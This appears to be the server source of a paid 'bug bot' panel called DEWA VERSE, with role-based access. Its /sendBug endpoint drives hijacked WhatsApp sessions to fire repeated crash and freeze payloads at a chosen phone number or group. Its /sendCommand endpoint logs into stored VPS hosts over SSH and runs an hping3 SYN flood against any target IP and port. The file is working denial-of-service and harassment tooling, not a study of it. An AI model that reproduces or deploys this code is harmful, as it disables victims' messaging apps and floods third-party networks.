const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const config = require('./config.js');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "xfcui", bug_name: "CRASH UI" },
  { bug_id: "fcc", bug_name: "FORCLOSE ONE MSG" },
  { bug_id: "fc", bug_name: "DELAY INVISIBLE PERMA" },
  { bug_id: "androidfrz", bug_name: "CRASH HOME" },
  { bug_id: "clickcrash", bug_name: "NOTIF CRASH"},
  { bug_id: "delay", bug_name: "DELAY FREZZ"},
  { bug_id: "iosXv", bug_name: "BLANK FREEZ"},
  { bug_id: "roid_group", bug_gb: "DELAY GB" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = config.TOKEN;
const bot = new TelegramBot(TOKEN, { polling: true });

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

const onlineUsers = new Set();

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const domain = config.DOMAIN;
const wsPort = config.WS_PORT;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://${domain}:${wsPort}`);
});

const PORT = config.PORT;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== CHAT ENDPOINTS ==========
// GET /api/chat/messages
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  
  // Ambil semua pesan yang melibatkan user ini
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

// POST /api/chat/send
app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public", // atau bisa pakai "public_chat"
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  // Broadcast ke semua client WebSocket yang terhubung
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/ttqfn9.jpg",
    title: "DEWA VERSE V1.0",
    desc: "gatau"
  },
    {
    image: "https://files.catbox.moe/ttqfn9.jpg",
    title: "DEWA VERSE V1.0",
    desc: "gatau"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "fc":
            for (let i = 0; i < 70; i++) await iNTofmSqL(sock, targetJid);
            await sleep(2000);
            await xvsp(sock,targetJid);
            await sleep(2000);
            await ofmSqLite(sock,targetJid);
            break;
          case "droid":
            for (let i = 0; i < 50; i++) { await callCrash(sock, targetJid); await sleep(100); }
            break;
          case "android":
            for (let i = 0; i < 60; i++) await D3nss(sock, targetJid);
            break;
          case "androidfrz":
            for (let i = 0; i < 15; i++) await lockMessages(sock,targetJid);
            break;
          case "clickcrash":
            for (let i = 0; i < 69; i++) await lockMessages(sock, targetJid);
            break;
          case "fcc":
            for (let i = 0; i < 75; i++) await VxLOneMsg(sock, targetJid); 
            break;
          case "ios":
            for (let i = 0; i < 60; i++) await iosXvLocX(sock, targetJid);
            break;
          case "iosXv":
            for (let i = 0; i < 60; i++) await lahora(sock, targetJid);
            break;
          case "delay":
            for (let i = 0; i < 50; i++) await botihunter(sock, targetJid);
            break;
          case "android_group":
            for (let i = 0; i < 100; i++) { await crashGroup(sock, targetJid); await sleep(1000); }
            break;
          case "lock_group":
            for (let i = 0; i < 100; i++) { await inTers(sock, targetJid); await sleep(1000); }
            break;
          case "roid_group":
            for (let i = 0; i < 100; i++) {
              await docthumb(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "xfcui":
            for (let i = 0; i < 60; i++) await lockMessages(sock, targetJid);
            break;
          case "exec":
            for (let i = 0; i < 100; i++) { await exeTrash(sock, targetJid); await sleep(1000); }
            break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

